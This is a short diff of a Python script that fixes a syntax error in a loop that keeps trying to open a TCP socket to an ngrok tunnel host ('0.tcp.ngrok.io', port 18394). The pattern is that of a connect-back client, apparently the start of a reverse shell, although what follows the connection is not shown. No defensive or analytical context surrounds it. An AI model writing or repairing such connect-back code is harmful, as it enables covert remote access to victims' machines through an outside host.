@@ -30,7 +30,7 @@ if __name__ == '__main__':
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('0.tcp.ngrok.io',18394)
+		s.connect(('0.tcp.ngrok.io',18394))
 		break
 	except:
 		time.sleep(5)
